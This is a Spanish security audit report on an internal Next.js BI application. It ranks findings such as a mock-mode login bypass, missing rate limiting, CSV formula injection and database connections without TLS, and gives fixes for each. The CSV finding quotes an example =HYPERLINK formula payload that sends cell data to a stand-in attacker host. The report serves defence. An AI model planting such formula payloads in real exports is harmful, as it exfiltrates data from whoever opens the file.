# Auditoría de seguridad de FOCUS — 22 de junio de 2026

> Revisión de seguridad de la aplicación FOCUS (Next.js 16 + Prisma 7 / MySQL 8 + next-auth v4 con login contra Active Directory por SOAP).
> Metodología: auditoría multiagente sobre 11 dimensiones, con **verificación adversarial independiente de cada hallazgo** (un escéptico que reabre el código e intenta refutarlo) y un crítico de exhaustividad final.
> Alcance: código de `app/` en `main`. Modelo de amenaza: **herramienta interna corporativa de BI de solo lectura**, accesible en la red corporativa, con login real contra AD y RLS deliberadamente desactivado (todos los usuarios autenticados ven todos los datos — decisión de negocio, no un fallo).

---

## 1. Resumen ejecutivo

La postura de seguridad de FOCUS es **sólida para una herramienta interna**. No se encontró ninguna vía de **lectura de datos sin autenticación**, ninguna **inyección SQL explotable** (pese al uso intensivo de `$queryRawUnsafe`, todo valor de usuario va parametrizado con `?` o está restringido a listas blancas/enteros), ni ninguna **escalada de privilegios** a `IAM_MANAGE` desde la aplicación. React autoescapa y no hay `dangerouslySetInnerHTML`; el cliente SOAP escapa correctamente el XML y verifica TLS.

Los problemas se concentran en **endurecimiento operativo y de configuración**, no en agujeros remotos. El más grave es un **fallo de "fail-open"**: `AUTH_ALLOW_MOCK=true` desactiva por completo la verificación de contraseña sin ninguna atadura a `NODE_ENV`, y como los dos únicos usuarios reales son ADMINISTRADOR, una sola variable de entorno mal puesta en producción se convierte en **toma de control total como administrador sin contraseña**.

| Severidad | Nº | Resumen |
|---|---|---|
| 🔴 Alta | 1 | Mock-mode sin guarda de `NODE_ENV` → login sin contraseña como admin |
| 🟠 Media | 4 | Sin rate-limiting en login; PII de clientes sin gitignore; inyección de fórmulas CSV; adapter MySQL sin TLS + `allowPublicKeyRetrieval` |
| 🟡 Baja | 18 | Endurecimiento: cabeceras HTTP, export sin tope, integridad del log de auditoría, IP falsificable, credencial en `scratch/`, etc. |
| ⚪ Info | varios | Notas de modelo de amenaza y deuda heredada (passport MD5, dependencia de AD, etc.) |
| ✅ Descartados | 4 | Falsos positivos refutados en la verificación (ver §6) |

Métricas del análisis: 11 dimensiones, **45 hallazgos examinados, 41 supervivientes** tras la verificación adversarial, 57 subagentes.

### Acciones prioritarias (quick wins de alto impacto)

1. **Atar el modo mock a `NODE_ENV !== 'production'`** y abortar el arranque si `AUTH_ALLOW_MOCK=true` en producción. *(1 línea, cierra el único hallazgo alto.)*
2. **Añadir reglas a `.gitignore`** para `docs/executive/*.csv` y `*.xlsx` (y borrar/mover `backfill_cif_recuperado.csv`, 10.557 filas con CIF reales) antes de que un `git add .` lo publique en Azure DevOps.
3. **Neutralizar inyección de fórmulas CSV** en `csvCell` (prefijar con `'` los valores que empiezan por `= + - @ \t \r`), centralizando el helper compartido por los 3 exports.
4. **Rotar la contraseña de `focus_app`** (committeada en `app/scratch/explain.js` y en el historial) y sacar `app/scratch/*` del control de versiones.
5. **Configurar TLS en el adapter MariaDB** (`ssl` + `allowPublicKeyRetrieval:false` por entorno) antes de cualquier despliegue donde app y MySQL no estén en el mismo host.
6. **Rate-limiting en `/api/auth`** (por IP y por usuario) para no convertir FOCUS en amplificador de fuerza bruta / bloqueo de cuentas contra el AD corporativo.

---

## 2. Hallazgo ALTO

### A-1 · `AUTH_ALLOW_MOCK` sin guarda de `NODE_ENV` → login sin contraseña como administrador
- **Archivo:** `app/src/lib/auth.ts:92-126` · **CWE-287 / CWE-489**
- **Qué pasa:** cuando `process.env.AUTH_ALLOW_MOCK === 'true'`, el bloque `if (!mockMode)` (línea 94) salta **toda** la validación contra AD, incluida la comprobación de presencia de contraseña (línea 96). La autenticación degrada a "¿es este usuario una fila activa en `APP_USERS`?". No hay ninguna atadura a `NODE_ENV` (solo se usa en la línea 8 para el flag `secure` de las cookies).
- **Impacto (reforzado por el crítico):** en modo mock se saltan **tanto `loginLdapAd` como `existeUsuarioLdapAd`**; lo único que se valida es `loadUserScope`. Como los únicos usuarios reales y activos son `defru-li` y `uriza-jo`, **ambos ADMINISTRADOR**, conocer cualquiera de esos dos nombres (documentados en `CLAUDE.md`) basta para entrar **sin contraseña como admin con `IAM_MANAGE`**. El acceso se audita además como `LOGIN_SUCCESS` legítimo (`metadata:{mock:true}`).
- **Disparador:** copiar un `.env` de dev, dejar la variable tras un troubleshooting, o ponerla por error en producción. Una sola variable, sin guarda secundaria.
- **Remediación:**
  ```ts
  const mockMode =
    process.env.NODE_ENV !== 'production' &&
    process.env.AUTH_ALLOW_MOCK === 'true';
  ```
  Y, en el arranque, lanzar/loguear en alto si se detecta `AUTH_ALLOW_MOCK=true` con `NODE_ENV==='production'`. El modo mock no debería poder conceder `IAM_MANAGE` jamás.

---

## 3. Hallazgos MEDIOS

### M-1 · Sin rate-limiting / throttling en el login (fuerza bruta + DoS de bloqueo de cuentas AD)
- **Archivo:** `app/src/lib/auth.ts:72-118` · **CWE-307**
- `authorize()` reenvía cada par de credenciales a `loginLdapAd` sin contador, retardo, lockout ni CAPTCHA. Cada intento se audita pero nada actúa sobre el volumen; el único límite natural es el timeout SOAP de 10 s.
- **Impacto:** cualquier host de la red puede scriptar POSTs a `/api/auth/callback/credentials` para (a) hacer *password-spraying* contra el AD corporativo a través de FOCUS y (b) **disparar la política de bloqueo del propio AD** martilleando usuarios conocidos — un DoS que deja a colegas fuera de **todos** los sistemas AD, no solo FOCUS. FOCUS se convierte en superficie de ataque no autenticada contra el directorio.
- **Remediación:** throttling por IP y por usuario (backoff exponencial / bloqueo temporal tras N fallos) antes de llamar a `loginLdapAd`; coordinar con la política de lockout del AD. Considerar un *circuit breaker* para fallar rápido si el AD no responde.

### M-2 · CSV con PII de clientes (10.557 filas, CIF + facturación) en `docs/executive/` sin gitignore
- **Archivo:** `docs/executive/backfill_cif_recuperado.csv` · **CWE-359**
- El fichero (cabecera `customer_id,sap_code,name,new_tax,importe,facturas,cat,ambiguo`) contiene datos reales: nombre de empresa, CIF recuperado (p. ej. `ESB73931271`), importe facturado y nº de facturas. Está **sin trackear** pero `git check-ignore` devuelve "no ignorado": `.gitignore` solo cubre `data/raw/**/*.csv`, **no** `docs/executive/`. Lo mismo aplica a `Focus_Calidad_Dato_Clientes_2026-06-15_actual.xlsx`.
- **Impacto:** un `git add .` rutinario commitearía este dataset RGPD-sensible al repo de Azure DevOps y a su historial, irreversible sin reescribir historia. *(Los XLSX ya committeados en `docs/executive/` se revisaron y solo contienen agregados, no PII fila a fila.)*
- **Remediación:** añadir `docs/executive/*.csv` y `*.xlsx` a `.gitignore` (whitelisteando los entregables agregados intencionados), y borrar/mover el CSV fuera del árbol del repo cuando termine el backfill.

### M-3 · Inyección de fórmulas CSV en los 3 exports; vector almacenado **no autenticado** vía log de auditoría
- **Archivos:** `app/src/app/api/clientes/export/route.ts:20-25`, `oportunidades/export/route.ts:16-21`, `auditoria/export/route.ts:22-27` · **CWE-1236**
- `csvCell` solo aplica entrecomillado RFC-4180 (`/[",;\n\r]/`); **no** neutraliza los caracteres de fórmula iniciales `=`, `+`, `-`, `@`, TAB, CR. Un valor como `=HYPERLINK("http://evil/?"&A1,"click")` se escribe como fórmula viva.
- **Vector clave (verificado):** el `username` de un `LOGIN_FAILED` se almacena **antes** de validar contra AD (`auth.ts:75-87`), pasando por `normalizeUsername`, que **no** filtra el prefijo de fórmula (los payloads que empiezan por `=`, `+`, `-` sobreviven; solo `@` se descarta al partir por `@`). El `user-agent` se guarda verbatim. Es decir, **un atacante no autenticado** siembra el log; cuando un ADMINISTRADOR exporta `/api/auditoria/export` y abre el CSV en Excel/LibreOffice, la celda se interpreta como fórmula (exfiltración vía `=HYPERLINK`/`=WEBSERVICE`; DDE/RCE requiere saltarse los avisos del cliente). `legal_name` en los exports de clientes/oportunidades es un vector secundario de menor probabilidad.
- **Remediación:** en `csvCell`, si el valor empieza por `= + - @ \t \r`, prefijar con `'` (o espacio) y entrecomillar; aplicarlo a **todas** las celdas. Centralizar `csvCell` en un único util compartido para que las tres copias no diverjan. Complementariamente, sanear CR/LF/control en `username`/`userAgent` antes de insertarlos en `AUDIT_EVENTS`.

### M-4 · Adapter MariaDB con `allowPublicKeyRetrieval:true` y sin TLS
- **Archivo:** `app/src/lib/prisma.ts:19-31` *(detectado por el crítico de exhaustividad, confirmado manualmente)* · **CWE-319**
- El adapter fija `allowPublicKeyRetrieval: true` y **no** establece `ssl`, sin conmutador por entorno. El propio comentario dice "en producción usar TLS (`ssl:true`)" pero el código nunca lo hace.
- **Impacto:** con `caching_sha2_password` (default de MySQL 8), `allowPublicKeyRetrieval` permite a un MITM en el enlace a la BD sustituir su propia clave RSA y **capturar la contraseña de BD en claro** durante el handshake. Hoy el despliegue es `localhost` (dev), donde el riesgo es bajo; pero un despliegue de producción con MySQL remoto usará silenciosamente el ajuste permisivo de dev.
- **Remediación:** controlar `ssl` y `allowPublicKeyRetrieval` por variable de entorno (por defecto `ssl` ON / `allowPublicKeyRetrieval` OFF en producción) y fallar cerrado si el host de `DATABASE_URL` no es local y no hay TLS.

---

## 4. Hallazgos BAJOS (endurecimiento)

| ID | Hallazgo | Archivo | Nota |
|---|---|---|---|
| B-1 | **Sin cabeceras de seguridad HTTP** (ni CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy). Clickjacking sobre `/accesos` y cero defensa en profundidad ante XSS | `app/next.config.ts` (vacío) | Añadir `headers()` con `frame-ancestors 'none'`/`X-Frame-Options: DENY`, CSP, `nosniff`, HSTS |
| B-2 | **Credencial real de `focus_app` hardcodeada y committeada** (también en el historial); el `.gitignore` posterior no la destrackea | `app/scratch/explain.js:40` | Rotar contraseña, `git rm --cached app/scratch/*`, purgar historial si procede. *(La `.env` viva usa otra clave → parece ya rotada, pero asumirla comprometida.)* |
| B-3 | **Export de clientes/oportunidades ignora `MAX_EXPORT_ROWS`** (constante muerta): `exportAll:true` quita el `LIMIT` y se transmite todo el Golden Record (~244k). Auto-DoS de recursos, no de confidencialidad (datos ya globales) | `clientes/export/route.ts:15,66,111-147`; `customers.ts:747,767` | Cortar el bucle al llegar al tope, como hace el export de auditoría |
| B-4 | **Arrays multi-select sin tope** → listas `IN(?,…)` arbitrariamente grandes | `clientes/export/route.ts:37-59`; `customers.ts` | Limitar longitud (p. ej. 200) y/o validar contra catálogos conocidos en `getMulti` |
| B-5 | **`search`/`postalCode` permiten comodines LIKE** del usuario → escaneos completos no sargables | `customers.ts:188-191,230-237` | Escapar `% _ \`; longitud mínima de `search` |
| B-6 | **Sin rate-limiting en endpoints de agregación/export pesados** (la caché no ayuda con filtros variados) | export routes / `customers.ts` | Límite por usuario / cola para exports |
| B-7 | **Log de auditoría sin protección de manipulación a nivel BD**: el mismo usuario MySQL compartido tiene DML sobre `AUDIT_EVENTS` | `prisma.ts`; migración `…_add_audit_events` | Conceder solo INSERT+SELECT al usuario runtime; triggers `BEFORE UPDATE/DELETE`; o sink externo (SIEM). *(No alcanzable desde la app: requiere acceso directo a BD.)* |
| B-8 | **Escrituras de auditoría se descartan en silencio** si falla la BD (`recordAuditEvent` nunca lanza, solo `console.error`) | `audit.ts:67-93` | Emitir log estructurado de alta severidad + canal de respaldo (fichero/syslog) para eventos AUTH |
| B-9 | **IP de auditoría falsificable** vía `X-Forwarded-For`/`X-Real-IP` (sin validación de proxy de confianza; se toma el primer salto) | `audit.ts:40-45,96-119` | Resolver IP desde proxy de confianza (salto derecho) o peer de conexión; documentar que el proxy debe sobrescribir XFF |
| B-10 | **Intentos de autorización denegados no se auditan** (un USUARIO sondeando `/accesos`, `/auditoria`, exports no deja rastro) | `auditoria/export/route.ts:29-33`; `accesos/actions.ts` | Añadir evento `AUTHZ_DENIED` en los checks de `IAM_MANAGE` |
| B-11 | **Sin saneado de caracteres de control en campos de auditoría** (log forging + alimenta la inyección CSV de M-3); XSS mitigado por React | `audit.ts:35-38,76` | Stripear CR/LF/control antes de insertar |
| B-12 | **Respuesta SOAP parseada por regex, no por parser XML**: una respuesta MITM/spoofeada con `<LoginLDAP_ADResult>OK</…>` forjaría un login | `ad-soap.ts:105-199` | Parser XML real anclado al elemento de resultado; considerar *cert pinning*. *(No alcanzable sin romper TLS, que está intacto.)* |
| B-13 | **El login depende por completo de un host SOAP de terceros** (acoplamiento de disponibilidad + amplificación de DoS de login) | `auth.ts:94-117` | Rate-limiting + circuit breaker (el timeout de 10 s ya mitiga) |
| B-14 | **Usuarios desactivados/cambiados conservan sesión hasta el TTL de scope (~10 s)**; los JWT no son revocables server-side | `auth.ts:13,182-213` | Aceptable por el TTL corto; para garantías fuertes, releer `isActive` en acciones `IAM_MANAGE` o store de sesión revocable |
| B-15 | **`xlsx@0.18.5` abandonado/vulnerable** (prototype pollution CVE-2023-30533, ReDoS CVE-2024-22363; sin fix en npm) | `app/package.json:54` | Solo en seeds offline (cero superficie web). Migrar a `exceljs`/`node-xlsx` o fijar el tarball del CDN de SheetJS; validar columnas esperadas |
| B-16 | **Server actions devuelven `error.message` crudo al cliente** (posible filtración de detalles Prisma/SQL); solo alcanzable por admin | `accesos/actions.ts:59-62,198-201` | Mensaje genérico al cliente, detalle solo en `console.error` |
| B-17 | **`REVALIDATE_SECRET` comparado con `===` (no constante)** + `/api/revalidate` autoriza cualquier sesión pese a documentar `DATA_MANAGE` (permiso inexistente). Impacto: invalidación de caché, sin exposición de datos | `revalidate/route.ts:21-30` | `crypto.timingSafeEqual`; gatear con `IAM_MANAGE` o corregir el docstring |
| B-18 | **`app/test_export.csv` trackeado y sin gitignore** (vacío hoy; un export de prueba a ese nombre commitearía PII) | `app/test_export.csv` | `git rm --cached`; patrón `*export*.csv` en `.gitignore` |
| B-19 | **Módulos con secretos sin `import 'server-only'`** (riesgo latente de arrastrar `AD_SOAP_LDAP_KEY`/`DATABASE_URL` al bundle si un refactor importa un helper desde un client component) | `ad-soap.ts`, `prisma.ts`, `auth.ts`, `audit.ts` | Añadir `import 'server-only'`; separar `normalizeUsername` a un módulo sin secretos |
| B-20 | **TOCTOU + identidad sensible a *case* en `createAppUser`** (`findUnique`→`create` sin transacción; `username` guardado con casing de AD, login resuelve en minúsculas → depende de la collation de MySQL) | `accesos/actions.ts:114-145` | Transacción + capturar `P2002`; guardar el `username` ya normalizado (minúsculas) para que almacenamiento y lookup usen la misma clave |
| B-21 | **`app/update-ids.js` (codegen committeado) reescribe `customers.ts` por regex**; re-ejecutarlo puede regenerar el data layer sin revisión | `app/update-ids.js` | Mover a `tools/` o sacar del árbol trackeado; añadir pre-commit para artefactos scratch |
| B-22 | **Seeds interpolan valores de Excel en SQL** (`('${d}','${s}')`) asumiendo "solo dígitos" sin validarlo — mismo patrón que el footgun de `dashboard.ts:112-114` | `11-billing-salesorder-backfill.ts:67`, `15-…`, `dashboard.ts:112-114` | Validar/parametrizar; offline y sobre datos confiables, pero es deuda latente |

---

## 5. Lo que se verificó CORRECTO (fortalezas)

- **Inyección SQL:** pese al uso intensivo de `$queryRawUnsafe`, **todo** valor de usuario va como parámetro `?`; las interpolaciones son listas blancas (`sortField`/`sortDir` vía `Record`+ternario, rangos de importe contra `AMOUNT_RANGES`) o enteros coercionados (`minAmount`, `LIMIT/OFFSET`, `buIds`). Los `IN(...)` de ids provienen de la BD (sin inyección de segundo orden). `audit.ts` usa solo el query builder tipado. **Sin SQLi explotable.**
- **Autorización:** `proxy.ts` exige token en todo salvo `/login`, `/api/auth` y estáticos; `/accesos` y `/auditoria` validan `IAM_MANAGE` a nivel de página **y** de server action; los exports exigen sesión (auditoría además `IAM_MANAGE`). **Sin escalada a `IAM_MANAGE`.**
- **XSS:** cero `dangerouslySetInnerHTML`/`innerHTML`/`eval`/`new Function`; React autoescapa las cadenas de BD; tooltips de recharts por defecto.
- **SOAP/SSRF:** `xmlEscape` cubre los 5 caracteres XML y se aplica a usuario, contraseña y passport; TLS verificado (sin `rejectUnauthorized:false` ni override en todo el repo); la URL del AD nunca depende de input de usuario; timeout acotado; la contraseña nunca se loguea ni persiste.
- **Secretos/config:** `.env*` correctamente gitignoreados (nunca se committeó un `.env` real); **sin variables `NEXT_PUBLIC_`** que filtren secretos al bundle; sin source maps de producción; fallbacks de secretos *fail-closed*/*fail-loud*.
- **Cookies:** `httpOnly`, `sameSite=lax`, `secure` en prod, prefijos `__Secure-`/`__Host-`; CSRF de next-auth presente.
- **Dependencias:** lockfile committeado; los avisos de `npm audit` (next→postcss build-time, next-auth→uuid, cluster hono/esbuild de `@prisma/dev`) **no son alcanzables** en el runtime de producción.
- **Auditoría:** append-only a nivel de aplicación; snapshot de `username`/`user_full_name` que sobrevive al borrado del usuario (FK `ON DELETE SET NULL`); la contraseña nunca llega al log.

---

## 6. Falsos positivos descartados en la verificación

La verificación adversarial **refutó** 4 hallazgos (transparencia — no requieren acción):

1. **`NEXTAUTH_SECRET` no fijado explícitamente en `authOptions`** → es el patrón estándar de next-auth v4; en producción **lanza** si falta. La `.env` viva usa un secreto fuerte de 32 bytes y está gitignoreada. *(Aun así, ver recomendación de endurecimiento abajo.)*
2. **`roleId` no validado en `updateAppUserRole`** → la FK de `APP_USER_ROLES` rechaza un `roleId` inexistente y la transacción revierte; solo alcanzable por admin. Nit de consistencia, no vuln.
3. **next-auth → `uuid@8.3.2` (GHSA-w5hq-g745-h8pq)** → la ruta vulnerable (v3/v5/v6 con `buf`) no se ejerce; next-auth usa `v4()` sin buffer. Ruido de auditoría. **No** degradar a next-auth v3.
4. **Ausencia de `error.tsx`/`global-error.tsx`** → Next.js enmascara errores en producción por defecto; el "fallo" requiere desplegar con `NODE_ENV!==production`, que no es controlable por el atacante.

---

## 7. Recomendaciones de endurecimiento adicionales

- **`NEXTAUTH_SECRET`:** aunque se refutó como vuln activa, fijar `secret: process.env.NEXTAUTH_SECRET` explícitamente y aserción de arranque (lanzar si falta o coincide con el placeholder de `.env.example`), independiente de `NODE_ENV`.
- **Defensa en profundidad de auth:** `segmentacion` y `top-clientes` son las **únicas** páginas del dashboard que no llaman a `getServerSession` (dependen solo del middleware). Añadir el check en componente — referencia: el bypass de middleware CVE-2025-29927 (FOCUS está parcheado en 16.2.6, pero la dependencia única del middleware es frágil). Centralizar en un helper compartido por todas las páginas `(dashboard)`.
- **Componentes `@tuvsud/design-system` (`Ts*`, Shoelace/Lit):** no se auditaron sus internos; cadenas de BD (`legal_name`, contactos, metadata) se pasan como props/slots. Hacer *spot-check* de los componentes que renderizan contenido rico/tooltips y usar el **CSP** (B-1) como control compensatorio.
- **Enumeración de usuarios:** `/login` devuelve `NO_FOCUS_ACCESS` distinguible, confirmando credenciales AD válidas sin acceso a FOCUS (oráculo de validación de credenciales). Devolver `BAD_CREDENTIALS` genérico a llamantes anónimos; gana relevancia combinado con la falta de rate-limiting (M-1).

---

## 8. Metodología y cobertura

Las 11 dimensiones auditadas: autenticación/sesión, autorización/control de acceso, inyección SQL/capa de datos, validación de entrada/DoS, secretos/configuración/git, exposición de datos/CSV/PII, SSRF/XML/SOAP, web (XSS/CSRF/cabeceras), dependencias/cadena de suministro, integridad del log de auditoría, y misconfiguración específica de Next.js. Cada hallazgo de cada dimensión fue reabierto y verificado por un agente escéptico independiente que reproduce el código y ajusta la severidad; un crítico final revisó la cobertura y aportó los huecos no cubiertos por ninguna dimensión (mock-mode como toma de control de admin, TOCTOU de alta de usuario, `xlsx` en ETL, `update-ids.js`, **adapter MariaDB sin TLS**, componentes del design-system y `NEXTAUTH_SECRET` fail-closed).

**Limitaciones:** análisis estático de código (sin pentest dinámico en ejecución); no se auditaron los internos de `node_modules` (incl. `@tuvsud/design-system`) más allá del análisis de versiones/CVE; el modelo de amenaza asume el despliegue interno corporativo descrito en `CLAUDE.md`.
